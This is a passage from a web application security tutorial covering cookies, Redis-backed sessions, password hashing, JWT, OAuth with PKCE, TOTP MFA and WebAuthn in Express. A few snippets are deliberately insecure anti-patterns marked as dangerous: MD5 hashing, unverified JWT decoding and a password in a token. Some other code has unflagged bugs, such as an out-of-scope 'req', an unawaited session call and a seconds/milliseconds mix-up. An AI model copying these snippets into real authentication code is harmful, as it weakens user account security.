Max-Age & Expires"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Session cookie (deleted when browser closes)\nres.cookie('session', value);\n\n// Persistent cookie with Max-Age (in seconds)\nres.cookie('remember', value, { maxAge: 30 * 24 * 60 * 60 * 1000 }); // 30 days\n\n// Persistent cookie with Expires\nconst expiryDate = new Date(Date.now() + 60 * 60 * 1000); // 1 hour\nres.cookie('temp', value, { expires: expiryDate });\n"})}),"\n",(0,r.jsx)(n.h3,{id:"cookie-best-practices",children:"Cookie Best Practices"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Authentication Cookie (Most Secure):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"res.cookie('sessionId', sessionId, {\n  httpOnly: true,      // Prevent XSS access\n  secure: true,        // HTTPS only\n  sameSite: 'strict',  // Strong CSRF protection\n  maxAge: 3600000,     // 1 hour\n  signed: true         // Cryptographic signature\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Session Cookie Configuration:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const session = require('express-session');\n\napp.use(session({\n  secret: process.env.SESSION_SECRET,\n  name: 'sid', // Don't use default name\n  resave: false,\n  saveUninitialized: false,\n  cookie: {\n    httpOnly: true,\n    secure: process.env.NODE_ENV === 'production',\n    sameSite: 'strict',\n    maxAge: 1000 * 60 * 60 * 24 // 24 hours\n  },\n  store: new RedisStore({ client: redisClient }) // Use persistent store\n}));\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Cookie Prefixes:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// __Secure- prefix: Must be set with Secure flag\nres.cookie('__Secure-sessionId', value, {\n  secure: true,\n  httpOnly: true,\n  sameSite: 'strict'\n});\n\n// __Host- prefix: More restrictive\nres.cookie('__Host-sessionId', value, {\n  secure: true,\n  httpOnly: true,\n  sameSite: 'strict',\n  path: '/',\n  domain: undefined // Cannot set domain\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"session-management",children:"Session Management"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Best Practices:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Secure Session Generation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const crypto = require('crypto');\n\nfunction generateSessionId() {\n  return crypto.randomBytes(32).toString('hex');\n}\n\n// Store in secure backend (Redis recommended)\nasync function createSession(userId) {\n  const sessionId = generateSessionId();\n  const sessionData = {\n    userId,\n    createdAt: Date.now(),\n    expiresAt: Date.now() + 3600000, // 1 hour\n    ipAddress: req.ip,\n    userAgent: req.headers['user-agent']\n  };\n\n  await redisClient.setex(\n    `session:${sessionId}`,\n    3600, // TTL in seconds\n    JSON.stringify(sessionData)\n  );\n\n  return sessionId;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Session Validation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"async function validateSession(sessionId) {\n  const sessionData = await redisClient.get(`session:${sessionId}`);\n\n  if (!sessionData) {\n    return null; // Session expired or invalid\n  }\n\n  const session = JSON.parse(sessionData);\n\n  // Check expiration\n  if (Date.now() > session.expiresAt) {\n    await redisClient.del(`session:${sessionId}`);\n    return null;\n  }\n\n  // Additional checks\n  if (session.ipAddress !== req.ip) {\n    // Log suspicious activity\n    logger.warn('IP mismatch for session', { sessionId, userId: session.userId });\n    // Optional: invalidate session\n  }\n\n  return session;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Session Rotation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Rotate session ID after privilege escalation\nasync function rotateSession(oldSessionId) {\n  const oldSession = await redisClient.get(`session:${oldSessionId}`);\n\n  if (!oldSession) return null;\n\n  const newSessionId = generateSessionId();\n\n  // Copy session data to new ID\n  await redisClient.setex(\n    `session:${newSessionId}`,\n    3600,\n    oldSession\n  );\n\n  // Delete old session\n  await redisClient.del(`session:${oldSessionId}`);\n\n  return newSessionId;\n}\n\n// Use after login, password change, privilege escalation\napp.post('/login', async (req, res) => {\n  const user = await authenticateUser(req.body);\n\n  if (user) {\n    const sessionId = await createSession(user.id);\n\n    res.cookie('sessionId', sessionId, {\n      httpOnly: true,\n      secure: true,\n      sameSite: 'strict',\n      maxAge: 3600000\n    });\n\n    res.json({ success: true });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Logout & Session Termination:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"app.post('/logout', async (req, res) => {\n  const sessionId = req.cookies.sessionId;\n\n  if (sessionId) {\n    await redisClient.del(`session:${sessionId}`);\n  }\n\n  res.clearCookie('sessionId', {\n    httpOnly: true,\n    secure: true,\n    sameSite: 'strict'\n  });\n\n  res.json({ success: true });\n});\n\n// Logout all devices\napp.post('/logout-all', async (req, res) => {\n  const userId = req.user.id;\n\n  // Find all sessions for user\n  const keys = await redisClient.keys(`session:*`);\n\n  for (const key of keys) {\n    const session = await redisClient.get(key);\n    if (JSON.parse(session).userId === userId) {\n      await redisClient.del(key);\n    }\n  }\n\n  res.json({ success: true });\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Server-side session storage (Redis, database)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Secure session ID generation (crypto.randomBytes)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Session expiration and rotation\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," IP and User-Agent validation\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Client-side session storage\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Predictable session IDs\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Long-lived sessions without renewal\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Session fixation vulnerabilities"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"5-authentication--authorization",children:"5. Authentication & Authorization"}),"\n",(0,r.jsx)(n.h3,{id:"authentication-methods",children:"Authentication Methods"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Comparison Table:"})}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Method"}),(0,r.jsx)(n.th,{children:"Best For"}),(0,r.jsx)(n.th,{children:"Pros"}),(0,r.jsx)(n.th,{children:"Cons"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Session + Cookie"}),(0,r.jsx)(n.td,{children:"Traditional web apps"}),(0,r.jsx)(n.td,{children:"Server control, easy revocation"}),(0,r.jsx)(n.td,{children:"Scalability, CSRF risk"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"JWT"}),(0,r.jsx)(n.td,{children:"APIs, SPAs"}),(0,r.jsx)(n.td,{children:"Stateless, portable"}),(0,r.jsx)(n.td,{children:"Cannot revoke easily, larger size"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"OAuth 2.0"}),(0,r.jsx)(n.td,{children:"Third-party auth"}),(0,r.jsx)(n.td,{children:"Delegated auth, SSO"}),(0,r.jsx)(n.td,{children:"Complex, token management"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"WebAuthn"}),(0,r.jsx)(n.td,{children:"High security"}),(0,r.jsx)(n.td,{children:"Phishing-resistant, no passwords"}),(0,r.jsx)(n.td,{children:"Browser support, UX learning curve"})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"password-security",children:"Password Security"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Storage Best Practices:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const bcrypt = require('bcrypt');\nconst argon2 = require('argon2');\n\n// \u2705 SECURE - Bcrypt (industry standard)\nasync function hashPassword(password) {\n  const saltRounds = 12; // Higher = more secure but slower\n  return await bcrypt.hash(password, saltRounds);\n}\n\nasync function verifyPassword(password, hash) {\n  return await bcrypt.compare(password, hash);\n}\n\n// \u2705 EVEN BETTER - Argon2 (most modern)\nasync function hashPasswordArgon2(password) {\n  return await argon2.hash(password, {\n    type: argon2.argon2id,\n    memoryCost: 2 ** 16, // 64 MB\n    timeCost: 3,\n    parallelism: 1\n  });\n}\n\nasync function verifyPasswordArgon2(password, hash) {\n  return await argon2.verify(hash, password);\n}\n\n// \u274c INSECURE - Never do this\nfunction badHash(password) {\n  return crypto.createHash('md5').update(password).digest('hex');\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Password Policy Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const passwordValidator = require('password-validator');\n\nconst schema = new passwordValidator();\n\nschema\n  .is().min(12)                          // Minimum length 12\n  .is().max(128)                         // Maximum length 128\n  .has().uppercase()                     // Must have uppercase letters\n  .has().lowercase()                     // Must have lowercase letters\n  .has().digits(1)                       // Must have at least 1 digit\n  .has().symbols(1)                      // Must have at least 1 symbol\n  .has().not().spaces()                  // Should not have spaces\n  .is().not().oneOf(['Password123!', 'Admin123!']); // Blacklist common passwords\n\nfunction validatePassword(password) {\n  const errors = schema.validate(password, { list: true });\n\n  if (errors.length > 0) {\n    throw new Error(`Password validation failed: ${errors.join(', ')}`);\n  }\n\n  return true;\n}\n\n// Check against leaked password database\nconst hibp = require('hibp');\n\nasync function checkPasswordBreach(password) {\n  const breachCount = await hibp.pwnedPassword(password);\n\n  if (breachCount > 0) {\n    throw new Error(`This password has been exposed in ${breachCount} data breaches`);\n  }\n\n  return true;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Account Security Measures:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Rate limiting login attempts\nconst rateLimit = require('express-rate-limit');\n\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 5, // 5 attempts\n  message: 'Too many login attempts, please try again later',\n  standardHeaders: true,\n  legacyHeaders: false,\n  skipSuccessfulRequests: true\n});\n\napp.post('/login', loginLimiter, async (req, res) => {\n  // Login logic\n});\n\n// Account lockout after failed attempts\nasync function handleFailedLogin(userId) {\n  const key = `failed_attempts:${userId}`;\n  const attempts = await redisClient.incr(key);\n\n  if (attempts === 1) {\n    await redisClient.expire(key, 900); // 15 minutes\n  }\n\n  if (attempts >= 5) {\n    await lockAccount(userId, 1800); // Lock for 30 minutes\n    await notifyUser(userId, 'Account locked due to failed login attempts');\n  }\n\n  return attempts;\n}\n\nasync function lockAccount(userId, duration) {\n  await redisClient.setex(`account_locked:${userId}`, duration, '1');\n}\n\nasync function isAccountLocked(userId) {\n  return await redisClient.exists(`account_locked:${userId}`);\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"json-web-tokens-jwt",children:"JSON Web Tokens (JWT)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Structure:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Header.Payload.Signature\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const jwt = require('jsonwebtoken');\n\n// Generate tokens\nfunction generateTokens(user) {\n  const accessToken = jwt.sign(\n    {\n      userId: user.id,\n      email: user.email,\n      role: user.role\n    },\n    process.env.ACCESS_TOKEN_SECRET,\n    {\n      expiresIn: '15m',\n      issuer: 'api.example.com',\n      audience: 'example.com'\n    }\n  );\n\n  const refreshToken = jwt.sign(\n    {\n      userId: user.id,\n      tokenVersion: user.tokenVersion // For token revocation\n    },\n    process.env.REFRESH_TOKEN_SECRET,\n    {\n      expiresIn: '7d',\n      issuer: 'api.example.com',\n      audience: 'example.com'\n    }\n  );\n\n  return { accessToken, refreshToken };\n}\n\n// Verify JWT middleware\nfunction authenticateToken(req, res, next) {\n  const authHeader = req.headers['authorization'];\n  const token = authHeader && authHeader.split(' ')[1];\n\n  if (!token) {\n    return res.status(401).json({ error: 'No token provided' });\n  }\n\n  try {\n    const decoded = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, {\n      issuer: 'api.example.com',\n      audience: 'example.com'\n    });\n\n    req.user = decoded;\n    next();\n  } catch (err) {\n    if (err.name === 'TokenExpiredError') {\n      return res.status(401).json({ error: 'Token expired' });\n    }\n    return res.status(403).json({ error: 'Invalid token' });\n  }\n}\n\n// Refresh token endpoint\napp.post('/refresh', async (req, res) => {\n  const { refreshToken } = req.body;\n\n  if (!refreshToken) {\n    return res.status(401).json({ error: 'Refresh token required' });\n  }\n\n  try {\n    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);\n\n    // Check if user exists and token version matches\n    const user = await getUserById(decoded.userId);\n\n    if (!user || user.tokenVersion !== decoded.tokenVersion) {\n      return res.status(403).json({ error: 'Invalid refresh token' });\n    }\n\n    // Generate new access token\n    const accessToken = jwt.sign(\n      { userId: user.id, email: user.email, role: user.role },\n      process.env.ACCESS_TOKEN_SECRET,\n      { expiresIn: '15m' }\n    );\n\n    res.json({ accessToken });\n  } catch (err) {\n    return res.status(403).json({ error: 'Invalid refresh token' });\n  }\n});\n\n// Token revocation (by incrementing tokenVersion)\nasync function revokeAllTokens(userId) {\n  await db.query(\n    'UPDATE users SET token_version = token_version + 1 WHERE id = ?',\n    [userId]\n  );\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"JWT Storage Options:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. HttpOnly Cookie (Most Secure for Web):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Set JWT in HttpOnly cookie\nres.cookie('accessToken', accessToken, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  maxAge: 15 * 60 * 1000 // 15 minutes\n});\n\n// Frontend automatically sends cookie\nfetch('/api/protected', {\n  credentials: 'include'\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Authorization Header (Standard for APIs):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Frontend stores in memory (React example)\nconst [token, setToken] = useState(null);\n\n// Send with requests\nfetch('/api/protected', {\n  headers: {\n    'Authorization': `Bearer ${token}`\n  }\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"JWT Security Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Short-lived access tokens (15 minutes)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Refresh token rotation\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Strong secret keys (256-bit minimum)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Algorithm verification (RS256 for production)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Token version for revocation\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Storing sensitive data in payload\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Long-lived tokens without refresh\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," localStorage for tokens (XSS risk)\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Using 'none' algorithm"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common JWT Mistakes:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c DANGEROUS - No signature verification\nconst decoded = jwt.decode(token); // Never use decode without verify!\n\n// \u274c DANGEROUS - Algorithm confusion attack\njwt.verify(token, publicKey); // Specify algorithm explicitly\n\n// \u2705 SAFE\njwt.verify(token, publicKey, { algorithms: ['RS256'] });\n\n// \u274c DANGEROUS - Storing sensitive data\nconst token = jwt.sign({\n  userId: 123,\n  password: 'secret123' // Never store passwords in JWT!\n}, secret);\n\n// \u2705 SAFE - Only non-sensitive identifiers\nconst token = jwt.sign({\n  userId: 123,\n  role: 'user'\n}, secret);\n"})}),"\n",(0,r.jsx)(n.h3,{id:"oauth-20--openid-connect",children:"OAuth 2.0 & OpenID Connect"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"OAuth 2.0 Flow (Authorization Code):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:'1. User clicks "Login with Google"\n2. Redirect to: https://accounts.google.com/o/oauth2/auth?\n   - client_id=YOUR_CLIENT_ID\n   - redirect_uri=https://yourapp.com/callback\n   - response_type=code\n   - scope=openid email profile\n   - state=random_string (CSRF protection)\n\n3. User authorizes\n4. Redirect back with code: https://yourapp.com/callback?code=AUTH_CODE&state=random_string\n5. Exchange code for tokens\n6. Use access token to fetch user data\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Implementation with Passport.js:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const passport = require('passport');\nconst GoogleStrategy = require('passport-google-oauth20').Strategy;\n\npassport.use(new GoogleStrategy({\n    clientID: process.env.GOOGLE_CLIENT_ID,\n    clientSecret: process.env.GOOGLE_CLIENT_SECRET,\n    callbackURL: '/auth/google/callback',\n    scope: ['profile', 'email']\n  },\n  async (accessToken, refreshToken, profile, done) => {\n    try {\n      // Find or create user\n      let user = await User.findOne({ googleId: profile.id });\n\n      if (!user) {\n        user = await User.create({\n          googleId: profile.id,\n          email: profile.emails[0].value,\n          name: profile.displayName,\n          avatar: profile.photos[0].value\n        });\n      }\n\n      return done(null, user);\n    } catch (err) {\n      return done(err, null);\n    }\n  }\n));\n\n// Routes\napp.get('/auth/google',\n  passport.authenticate('google', { scope: ['profile', 'email'] })\n);\n\napp.get('/auth/google/callback',\n  passport.authenticate('google', { failureRedirect: '/login' }),\n  (req, res) => {\n    // Successful authentication\n    const sessionId = createSession(req.user.id);\n    res.cookie('sessionId', sessionId, {\n      httpOnly: true,\n      secure: true,\n      sameSite: 'lax'\n    });\n    res.redirect('/dashboard');\n  }\n);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"PKCE (Proof Key for Code Exchange) for SPAs:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Generate code verifier and challenge\nconst crypto = require('crypto');\n\nfunction generateCodeVerifier() {\n  return crypto.randomBytes(32).toString('base64url');\n}\n\nfunction generateCodeChallenge(verifier) {\n  return crypto\n    .createHash('sha256')\n    .update(verifier)\n    .digest('base64url');\n}\n\n// Step 1: Initiate OAuth flow\nconst codeVerifier = generateCodeVerifier();\nconst codeChallenge = generateCodeChallenge(codeVerifier);\n\n// Store verifier in session/localStorage\nsessionStorage.setItem('code_verifier', codeVerifier);\n\n// Redirect to authorization server\nconst authUrl = `https://auth.example.com/authorize?` +\n  `client_id=${CLIENT_ID}` +\n  `&redirect_uri=${REDIRECT_URI}` +\n  `&response_type=code` +\n  `&code_challenge=${codeChallenge}` +\n  `&code_challenge_method=S256` +\n  `&scope=openid profile email`;\n\nwindow.location.href = authUrl;\n\n// Step 2: Exchange code for token\nasync function exchangeCodeForToken(code) {\n  const codeVerifier = sessionStorage.getItem('code_verifier');\n\n  const response = await fetch('https://auth.example.com/token', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: new URLSearchParams({\n      grant_type: 'authorization_code',\n      code: code,\n      redirect_uri: REDIRECT_URI,\n      client_id: CLIENT_ID,\n      code_verifier: codeVerifier\n    })\n  });\n\n  const tokens = await response.json();\n  return tokens;\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"multi-factor-authentication-mfa",children:"Multi-Factor Authentication (MFA)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"TOTP (Time-based One-Time Password) Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const speakeasy = require('speakeasy');\nconst QRCode = require('qrcode');\n\n// Generate secret for user\nasync function setupMFA(userId, email) {\n  const secret = speakeasy.generateSecret({\n    name: `YourApp (${email})`,\n    issuer: 'YourApp'\n  });\n\n  // Save secret to database (encrypted)\n  await saveUserMFASecret(userId, secret.base32);\n\n  // Generate QR code\n  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);\n\n  return {\n    secret: secret.base32,\n    qrCode: qrCodeUrl\n  };\n}\n\n// Verify TOTP token\nfunction verifyMFAToken(secret, token) {\n  return speakeasy.totp.verify({\n    secret: secret,\n    encoding: 'base32',\n    token: token,\n    window: 2 // Allow 2 time steps before/after\n  });\n}\n\n// MFA login flow\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n\n  const user = await authenticateUser(email, password);\n\n  if (!user) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n\n  // Check if MFA is enabled\n  if (user.mfaEnabled) {\n    // Create temporary token for MFA verification\n    const tempToken = jwt.sign(\n      { userId: user.id, step: 'mfa_required' },\n      process.env.TEMP_TOKEN_SECRET,\n      { expiresIn: '5m' }\n    );\n\n    return res.json({\n      requiresMFA: true,\n      tempToken: tempToken\n    });\n  }\n\n  // No MFA, complete login\n  const sessionId = await createSession(user.id);\n  res.cookie('sessionId', sessionId, cookieOptions);\n  res.json({ success: true });\n});\n\napp.post('/verify-mfa', async (req, res) => {\n  const { tempToken, mfaToken } = req.body;\n\n  try {\n    const decoded = jwt.verify(tempToken, process.env.TEMP_TOKEN_SECRET);\n\n    if (decoded.step !== 'mfa_required') {\n      return res.status(403).json({ error: 'Invalid token' });\n    }\n\n    const user = await getUserById(decoded.userId);\n    const isValid = verifyMFAToken(user.mfaSecret, mfaToken);\n\n    if (!isValid) {\n      return res.status(401).json({ error: 'Invalid MFA token' });\n    }\n\n    // MFA verified, complete login\n    const sessionId = await createSession(user.id);\n    res.cookie('sessionId', sessionId, cookieOptions);\n    res.json({ success: true });\n\n  } catch (err) {\n    return res.status(403).json({ error: 'Invalid token' });\n  }\n});\n\n// Backup codes\nfunction generateBackupCodes(count = 10) {\n  const codes = [];\n  for (let i = 0; i < count; i++) {\n    codes.push(crypto.randomBytes(4).toString('hex').toUpperCase());\n  }\n  return codes;\n}\n\nasync function saveBackupCodes(userId, codes) {\n  const hashedCodes = await Promise.all(\n    codes.map(code => bcrypt.hash(code, 10))\n  );\n  await db.query(\n    'INSERT INTO mfa_backup_codes (user_id, code_hash) VALUES ?',\n    [hashedCodes.map(hash => [userId, hash])]\n  );\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"webauthn--passkeys",children:"WebAuthn & Passkeys"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Registration (Creating Passkey):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Server-side: Generate challenge\nconst { generateRegistrationOptions, verifyRegistrationResponse } = require('@simplewebauthn/server');\n\napp.post('/webauthn/register/start', async (req, res) => {\n  const user = req.user;\n\n  const options = generateRegistrationOptions({\n    rpName: 'YourApp',\n    rpID: 'example.com',\n    userID: user.id,\n    userName: user.email,\n    userDisplayName: user.name,\n    attestationType: 'none',\n    authenticatorSelection: {\n      authenticatorAttachment: 'platform', // 'platform' or 'cross-platform'\n      userVerification: 'required',\n      residentKey: 'required'\n    },\n    timeout: 60000\n  });\n\n  // Store challenge in session\n  req.session.challenge = options.challenge;\n\n  res.json(options);\n});\n\n// Client-side: Create credential\nasync function registerPasskey() {\n  const optionsResponse = await fetch('/webauthn/register/start', {\n    method: 'POST',\n    credentials: 'include'\n  });\n  const options = await optionsResponse.json();\n\n  // Browser API\n  const credential = await navigator.credentials.create({\n    publicKey: options\n  });\n\n  // Send credential to server\n  await fetch('/webauthn/register/finish', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    credentials: 'include',\n    body: JSON.stringify(credential)\n  });\n}\n\n// Server-side: Verify and store credential\napp.post('/webauthn/register/finish', async (req, res) => {\n  const user = req.user;\n  const credential = req.body;\n  const expectedChallenge = req.session.challenge;\n\n  try {\n    const verification = await verifyRegistrationResponse({\n      response: credential,\n      expectedChallenge: expectedChallenge,\n      expectedOrigin: 'https://example.com',\n      expectedRPID: 'example.com'\n    });\n\n    if (verification.verified) {\n      // Store credential in database\n      await db.query(\n        'INSERT INTO webauthn_credentials (user_id, credential_id, public_key, counter) VALUES (?, ?, ?, ?)',\n        [user.id, verification.registrationInfo.credentialID, verification.registrationInfo.credentialPublicKey, 0]\n      );\n\n      res.json({ success: true });\n    } else {\n      res.status(400).json({ error: 'Verification failed' });\n    }\n  } catch (err) {\n    res.status(400).json({ error: err.message });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Authentication (Using Passkey):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Server-side: Generate authentication challenge\nconst { generateAuthenticationOptions, verifyAuthenticationResponse } = require('@simplewebauthn/server');\n\napp.post('/webauthn/auth/start', async (req, res) => {\n  const { email } = req.body;\n\n  const user = await getUserByEmail(email);\n  if (!user) {\n    return res.status(404).json({ error: 'User not found' });\n  }\n\n  const userCredentials = await getUserCredentials(user.id);\n\n  const options = generateAuthenticationOptions({\n    rpID: 'example.com',\n    allowCredentials: userCredentials.map(cred => ({\n      id: cred.credentialId,\n      type: 'public-key',\n      transports: ['internal', 'hybrid']\n    })),\n    userVerification: 'required',\n    timeout: 60000\n  });\n\n  req.session.challenge = options.challenge;\n  req.session.userId = user.id;\n\n  res.json(options);\n});\n\n// Client-side: Get credential\nasync function authenticateWithPasskey(email) {\n  const optionsResponse = await fetch('/webauthn/auth/start', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    credentials: 'include',\n    body: JSON.stringify({ email })\n  });\n  const options = await optionsResponse.json();\n\n  const credential = await navigator.credentials.get({\n    publicKey: options\n  });\n\n  const response = await fetch('/webauthn/auth/finish', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    credentials: 'include',\n    body: JSON.stringify(credential)\n  });\n\n  return response.json();\n}\n\n// Server-side: Verify authentication\napp.post('/webauthn/auth/finish', async (req, res) => {\n  const credential = req.body;\n  const expectedChallenge = req.session.challenge;\n  const userId = req.session.userId;\n\n  const userCredential = await getCredentialById(credential.id);\n\n  if (!userCredential) {\n    return res.status(404).json({ error: 'Credential not found' });\n  }\n\n  try {\n    const verification = await verifyAuthenticationResponse({\n      response: credential,\n      expectedChallenge: expectedChallenge,\n      expectedOrigin: 'https://example.com',\n      expectedRPID: 'example.com',\n      authenticator: {\n        credentialID: userCredential.credentialId,\n        credentialPublicKey: userCredential.publicKey,\n        counter: userCredential.counter\n      }\n    });\n\n    if (verification.verified) {\n      // Update counter\n      await updateCredentialCounter(credential.id, verification.authenticationInfo.newCounter);\n\n      // Create session\n      const sessionId = await createSession(userId);\n      res.cookie('sessionId', sessionId, cookieOptions);\n      res.json({ success: true });\n    } else {\n      res.status(401).json({ error: 'Verification failed' });\n    }\n  } catch (err) {\n    res.status(401).json({ error: err.message });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"authorization-patterns",children:"Authorization Patterns"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Role-Based Access Control (RBAC):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Define roles and permissions\nconst ROLES = {\n  ADMIN: 'admin',\n  MODERATOR: 'moderator',\n  USER: 'user',\n  GUEST: 'guest'\n};\n\nconst PERMISSIONS = {\n  USER_CREATE: 'user:create',\n  USER_READ: 'user:read',\n  USER_UPDATE: 'user:update',\n  USER_DELETE: 'user:delete',\n  POST_CREATE: 'post:create',\n  POST_UPDATE_OWN: 'post:update:own',\n  POST_UPDATE_ANY: 'post:update:any',\n  POST_DELETE_ANY: 'post:delete:any'\n};\n\nconst ROLE_PERMISSIONS = {\n  [ROLES.ADMIN]: Object.values(PERMISSIONS),\n  [ROLES.MODERATOR]: [\n    PERMISSIONS.USER_READ,\n    PERMISSIONS.POST_CREATE,\n    